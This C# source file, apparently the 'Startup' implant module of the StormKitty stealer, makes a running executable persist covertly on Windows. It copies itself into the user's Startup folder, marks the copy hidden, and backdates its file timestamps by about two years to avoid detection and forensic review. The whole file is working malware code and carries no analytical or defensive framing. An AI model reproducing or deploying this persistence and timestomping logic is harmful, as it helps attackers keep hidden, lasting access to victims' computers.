using System;
using System.IO;

namespace StormKitty.Implant
{
    internal sealed class Startup
    {
        // Autorun path
        private static readonly string StartupDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        private static readonly string ExecutablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
        private static readonly string CopyExecutableTo = $"{StartupDirectory}\\{Path.GetFileName(ExecutablePath)}";

        // Change file creation date
        public static void SetFileCreationDate(string path = null)
        {
            string filename = path;
            if (path == null) filename = ExecutablePath;
            DateTime time = new DateTime(
                DateTime.Now.Year - 2, 5, 22, 3, 16, 28);

            File.SetCreationTime(filename, time);
            File.SetLastWriteTime(filename, time);
            File.SetLastAccessTime(filename, time);
        }

        // Hide executable
        public static void HideFile(string path = null)
        {
            string filename = path;
            if (path == null) filename = ExecutablePath;
            new FileInfo(filename).Attributes |= FileAttributes.Hidden;
        }

        // Check if app installed to autorun
        public static bool IsInstalled()
        {
            return File.Exists($"{StartupDirectory}\\{Path.GetFileName(ExecutablePath)}");
        }

        // Install app to autorun
        public static void Install()
        {
            File.Copy(ExecutablePath, CopyExecutableTo); // Copy to startup dir
            HideFile(CopyExecutableTo);
            SetFileCreationDate(CopyExecutableTo);
        }

        // Executable is running from startup directory
        public static bool IsFromStartup()
        {
            return ExecutablePath.StartsWith(StartupDirectory);
        }

    }
}
